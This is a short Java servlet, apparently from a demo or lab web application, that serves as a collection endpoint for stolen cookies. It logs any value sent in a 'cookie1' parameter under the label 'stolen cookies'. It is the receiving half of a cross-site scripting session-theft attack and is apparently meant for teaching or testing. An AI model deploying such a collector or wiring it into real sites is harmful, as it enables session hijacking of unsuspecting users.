package com.acc.controller;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/restricted/stealCookies")
public class StealCookieController extends HttpServlet
{
	protected void doGet(HttpServletRequest request,
			HttpServletResponse response) throws ServletException,
			IOException
	{
		String cookie = request.getParameter("cookie1");

		System.out.println("stolen cookies - " + cookie);
	}
}
